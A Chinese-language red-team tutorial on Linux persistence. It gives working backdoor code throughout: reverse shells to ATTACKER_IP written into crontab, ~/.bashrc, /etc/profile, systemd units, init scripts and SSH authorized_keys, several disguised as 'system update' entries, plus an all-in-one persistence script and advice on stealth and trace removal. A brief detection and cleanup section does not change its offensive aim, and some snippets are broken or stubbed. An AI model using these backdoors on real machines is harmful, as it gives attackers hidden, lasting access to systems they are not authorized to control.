# 持久化后门：crontab、rc文件、startup

持久化（Persistence）是红队攻击中的关键环节。在获取初始访问权限后，需要建立持久化的后门机制，确保在系统重启、会话断开或凭证更改后仍能维持访问权限。

---

## 持久化技术概览

### 什么是持久化？

持久化是指在目标系统中植入后门机制，使得攻击者在系统重启或会话断开后仍能重新获得访问权限的技术。

### 为什么需要持久化？

1. **维持访问**：防止因系统重启或会话断开而丢失访问权限
2. **隐蔽性**：好的持久化机制不易被发现
3. **自动化**：实现自动化的重新连接
4. **多点冗余**：建立多个后门点，提高容错能力

### 常见持久化方式

```
├── 定时任务类
│   ├── crontab定时任务
│   └── at一次性任务
├── 启动项类
│   ├── ~/.bashrc / ~/.bash_profile
│   ├── /etc/rc.local
│   └── systemd user service
├── SSH相关
│   ├── SSH密钥后门
│   └── SSH authorized_keys
└── 计划任务类
    └── Windows任务计划程序
```

---

## crontab持久化

### 基础crontab后门

```bash
# 创建反弹shell脚本
cat > /tmp/.shell.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/.shell.sh

# 添加crontab定时任务（每5分钟执行一次）
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.shell.sh") | crontab -
```

### 隐藏crontab任务

```bash
# 方法1：使用隐藏文件
cat > /tmp/..hidden.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/..hidden.sh

# 方法2：伪装成正常任务
(crontab -l 2>/dev/null; echo "*/5 * * * * /usr/bin/python /tmp/update.py") | crontab -

# 方法3：使用系统服务脚本
cat > /tmp/update.py << 'EOF'
import subprocess
subprocess.Popen(["bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"])
EOF
```

### 高级crontab技术

```bash
# 使用cron.d目录（系统级）
cat > /etc/cron.d/.backdoor << 'EOF'
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=""

# 每小时执行
0 * * * * root /tmp/.shell.sh

# 每天凌晨执行
0 0 * * * root /tmp/.shell.sh
EOF

# 使用anacron（适合不常开机的系统）
cat > /etc/cron.hourly/.update << 'EOF'
#!/bin/bash
/tmp/.shell.sh
EOF
chmod +x /etc/cron.hourly/.update
```

### crontab检测与清除

```bash
# 检测所有用户的crontab
for user in $(cut -f1 -d: /etc/passwd); do
    echo "=== $user ==="
    crontab -u $user -l 2>/dev/null
done

# 检查系统cron任务
ls -la /etc/cron.*
cat /etc/crontab

# 清除痕迹
crontab -r  # 删除当前用户所有crontab
```

---

## ~/.bashrc / ~/.bash_profile持久化

### 基础rc文件后门

```bash
# 在~/.bashrc中添加后门
cat >> ~/.bashrc << 'EOF'

# System update check
if [ -f /tmp/.update ]; then
    source /tmp/.update
fi
EOF

# 创建后门脚本
cat > /tmp/.update << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
EOF
chmod +x /tmp/.update
```

### 隐蔽rc文件后门

```bash
# 方法1：使用隐藏函数
cat >> ~/.bashrc << 'EOF'

# System function
function system_update() {
    local ip="ATTACKER_IP"
    local port=4444
    bash -i >& /dev/tcp/$ip/$port 0>&1 &
}
EOF

# 调用方式：system_update

# 方法2：使用PS1变量
cat >> ~/.bashrc << 'EOF'

# Custom prompt
PROMPT_COMMAND='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &'
EOF

# 方法3：使用环境变量
cat >> ~/.bashrc << 'EOF'

# Environment setup
export PATH="$PATH:/tmp/.hidden"
EOF
```

### 多用户rc文件后门

```bash
# 为所有用户添加后门
for user_home in /home/*; do
    if [ -f "$user_home/.bashrc" ]; then
        echo "" >> "$user_home/.bashrc"
        echo "# System check" >> "$user_home/.bashrc"
        echo "source /tmp/.system_update.sh" >> "$user_home/.bashrc"
    fi
done

# /etc/profile全局后门
cat >> /etc/profile << 'EOF'

# Global system check
if [ -f /tmp/.global_update ]; then
    source /tmp/.global_update
fi
EOF
```

---

## systemd user service持久化

### 创建systemd用户服务

```bash
# 创建服务目录
mkdir -p ~/.config/systemd/user/

# 创建服务文件
cat > ~/.config/systemd/user/.system-update.service << 'EOF'
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF

# 启用服务
systemctl --user enable .system-update.service
systemctl --user start .system-update.service
```

### 系统级systemd服务

```bash
# 创建系统服务
cat > /etc/systemd/system/.system-monitor.service << 'EOF'
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

# 启用服务
systemctl enable .system-monitor.service
systemctl start .system-monitor.service
```

### 隐蔽systemd服务

```bash
# 使用描述性名称
cat > /etc/systemd/system/network-monitor.service << 'EOF'
[Unit]
Description=Network Connectivity Monitor
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c "while true; do curl -s http://ATTACKER_IP:8080/heartbeat; sleep 300; done"
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
```

---

## SSH密钥后门

### 基础SSH密钥后门

```bash
# 生成SSH密钥对（在攻击者机器）
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""

# 将公钥添加到目标
cat backdoor_key.pub >> ~/.ssh/authorized_keys

# 设置正确权限
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh
```

### SSH authorized_keys命令后门

```bash
# 在authorized_keys中执行命令
echo 'command="/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"",no-port-forwarding,no-X11-forwarding ssh-rsa AAAA...' >> ~/.ssh/authorized_keys

# 使用密钥连接时会自动执行反弹shell
ssh -i backdoor_key user@target
```

### SSH密钥隐藏

```bash
# 使用无效注释隐藏密钥
echo "# System key" >> ~/.ssh/authorized_keys
echo "no-pty,permitopen=\"127.0.0.1:22\" ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# 使用environment选项
echo 'environment="SHELL=/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
```

### SSH配置后门

```bash
# 修改ssh_config
cat >> /etc/ssh/ssh_config << 'EOF'

# Custom configuration
Host *
    ProxyCommand /bin/bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
EOF
```

---

## 定时任务后门

### at一次性任务

```bash
# 创建一次性任务（系统重启后执行）
echo "/tmp/.shell.sh" | at now + 1 minute

# 查看at任务
atq

# 删除at任务
atrm 1
```

### 系统启动脚本

```bash
# /etc/rc.local后门（旧系统）
cat >> /etc/rc.local << 'EOF'
/tmp/.shell.sh &
EOF
chmod +x /etc/rc.local

# /etc/init.d后门（SysV init）
cat > /etc/init.d/.system-update << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-update
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Update Service
### END INIT INFO

case "$1" in
    start)
        /tmp/.shell.sh &
        ;;
    stop)
        ;;
esac
EOF
chmod +x /etc/init.d/.system-update
update-rc.d .system-update defaults
```

### PAM后门

```bash
# 使用PAM模块（高级技术）
cat > /tmp/.pam_backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// PAM后门代码示例
// 实际使用需要更复杂的实现
EOF
```

---

## 自动化持久化脚本

### 完整持久化脚本

```bash
#!/bin/bash
# persistence.sh - 自动化持久化脚本

ATTACKER_IP="ATTACKER_IP"
ATTACKER_PORT=4444

echo "[+] 开始建立持久化..."

# 1. crontab持久化
echo "[+] 配置crontab..."
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_update.sh") | crontab -

# 2. 创建后门脚本
cat > /tmp/.hidden_update.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &
EOF
chmod +x /tmp/.hidden_update.sh

# 3. ~/.bashrc持久化
cat >> ~/.bashrc << 'EOF'

# System update check
source /tmp/.system_check.sh 2>/dev/null
EOF

# 4. SSH密钥持久化
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 5. systemd服务持久化
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/.update.service << 'EOF'
[Unit]
Description=System Update

[Service]
Type=simple
ExecStart=/bin/bash /tmp/.hidden_update.sh
Restart=always

[Install]
WantedBy=default.target
EOF

echo "[+] 持久化建立完成"
```

---

## 检测与清除

### 检测持久化后门

```bash
# 检查crontab
for user in $(cut -f1 -d: /etc/passwd); do
    crontab -u $user -l 2>/dev/null
done

# 检查启动项
ls -la /etc/init.d/
ls -la /etc/rc*.d/
systemctl list-unit-files

# 检查SSH密钥
find / -name "authorized_keys" -type f 2>/dev/null
cat ~/.ssh/authorized_keys

# 检查bashrc
grep -r "source\|bash.*tcp" ~/.bashrc ~/.bash_profile /etc/profile

# 检查进程
ps aux | grep -E "bash.*tcp|python.*socket"
```

### 清除持久化后门

```bash
# 清除crontab
crontab -r

# 清除bashrc
sed -i '/source.*tmp/d' ~/.bashrc

# 清除SSH密钥
sed -i '/ssh-rsa AAAA/d' ~/.ssh/authorized_keys

# 清除systemd服务
systemctl --user disable .update.service
rm ~/.config/systemd/user/.update.service

# 清除临时文件
rm -f /tmp/.hidden_update.sh /tmp/.shell.sh
```

---

## 最佳实践

1. **多点冗余**：建立多个持久化点，提高容错能力
2. **隐蔽性**：使用隐藏文件、伪装文件名、加密通信
3. **自动化**：使用脚本自动化持久化过程
4. **监控**：定期检查系统状态，及时发现异常
5. **清理**：完成任务后及时清除后门痕迹

---

*最后更新：2026-08-22*
